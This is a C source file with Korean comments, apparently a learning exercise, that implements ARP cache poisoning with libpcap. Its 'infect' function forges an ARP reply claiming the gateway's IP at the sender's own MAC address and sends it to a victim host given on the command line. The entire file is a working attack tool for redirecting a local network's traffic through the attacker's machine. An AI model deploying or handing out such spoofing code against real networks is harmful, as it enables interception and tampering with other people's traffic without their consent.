#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include "arpheader.h"



void infect(char* argv[],pcap_t *handle,struct allpacket * rcv_packet)//rcv 받은 패킷
{
    /*
   //IP check
  int i=0;
  for(i=2;i<4;i++)
  {
      printf("aa %s\n",argv[i]);
  }*/
    printf("#########################################Start\n");
   //my mac 구하는 함수  -------------------------------
  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, "eth0");
  ioctl(fd, SIOCGIFHWADDR, &s);

  printf("My Mac Address : ");
  for (int x = 0; x < 6; ++x)
  printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
  printf("\n");

  //--------------------------------------------

  u_char pkt[PACKETSIZE];
  struct allpacket *s_packet = (struct allpacket *)pkt;
  //패킷 입력 시
  // dmac search------------------------------------- Destination 입력
  for(int i=0; i<=5;i++)
  {
      s_packet->eth_dmac[i] = rcv_packet->eth_smac[i]; //목적지 받은은 패킷의 시작 주소
      printf("dmac %x",s_packet->eth_dmac[i]);
  }
  //smac --------------------------------------------
  printf("smac :");
    for(int i=0; i<=5;i++)
    {
        s_packet->eth_smac[i] = (u_char)s.ifr_addr.sa_data[i];  //보낼 패킷의 시작은 나의 mac 입력
        printf("%02x ",s_packet->eth_smac[i]);
    }
    printf("\n");


      s_packet->type = ntohs(0x0806);                       //  ARP 0x0806
      printf("type : %04x\n",s_packet->type);
                                                            //ARP-----------------------------
      s_packet->hd_type = ntohs(0x0001);                    // HardWare type : ethernet 1
      printf("hd_type %04x\n",s_packet->hd_type);

      s_packet->protocol_type = ntohs(0x0800);               // Protocol type : IPv4 0x0800
      printf("protocol_type %04x\n",s_packet->protocol_type);

      s_packet->hd_size = 0x06;                             // Hardware size 6 , Protocol size 4
      s_packet->protocol_size = 0x04;

      printf("hd_size %02x\n",s_packet->hd_size);
      printf("protocol_size %02x\n",s_packet->protocol_size);

      s_packet->opcode = ntohs(0x0002);                     // OPcode 1 = request ,2 = reply
      printf("opcode %04x\n",s_packet->opcode);


      printf("sender mac : ");                        // 나의 mac 입력
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_sender_mac[i] = s_packet->eth_smac[i] ;
           printf(" %02x ", s_packet->arp_sender_mac[i]);
      }
      printf("\n");

                                                    //sender(피해자)의 IP (게이트웨이)
      inet_aton(argv[3],&s_packet->arp_sender_ip);
      //printf("#### %x \n",s_packet->arp_sender_ip);
      printf("\n");


      printf("Target Mac : ");                      // 속일 mac 주소 (감염시킬 pc의 주소)
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_target_mac[i] = rcv_packet->eth_smac[i] ;  //받은 패킷의 시작 주소
           printf(" %02x ", s_packet->arp_target_mac[i]);
      }


      inet_aton(argv[2],&s_packet->arp_target_ip);  // 감염시키려는 ip 주소
      printf("target IP = %x \n", s_packet->arp_target_ip);


      int res = pcap_sendpacket(handle,pkt,sizeof(pkt));

      if(res == -1)
             printf(" error\n");
      else
            printf("**********************************success \n");


}




